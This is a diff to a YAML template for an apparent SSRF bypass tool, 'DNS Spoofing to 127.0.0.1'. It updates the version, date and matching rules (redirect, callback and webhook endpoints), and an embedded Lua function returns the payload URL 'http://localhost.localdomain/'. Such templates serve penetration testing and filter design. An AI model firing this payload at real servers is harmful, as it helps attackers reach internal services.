@@ -1,11 +1,12 @@
+# 3. dns_spoofing.yaml
 meta:
   id: dns_spoofing
-  version: 1
+  version: 2
   name: "DNS Spoofing to 127.0.0.1"
   description: "Uses domain that resolves to localhost"
   author: "SSRFdevil"
   created: "2026-06-19"
-  updated: "2026-06-19"
+  updated: "2026-07-21"
   rank: 65
   confidence: 85
   severity: high
@@ -14,15 +15,15 @@ meta:
 
 match:
   schemes: [http, https]
-  requires: [hostname]
-  supports: [dns]
+  kinds: [Endpoint, Document]
+  allowed_methods: [GET, POST]
+  required_tags: [Redirect, Callback, Webhook]
+  require_params: true
 
 script:
   language: lua
   entry: bypass
   source: |
     function bypass(ctx)
-      return {
-        url = "http://localhost.localdomain/"
-      }
+      return { url = "http://localhost.localdomain/" }
     end
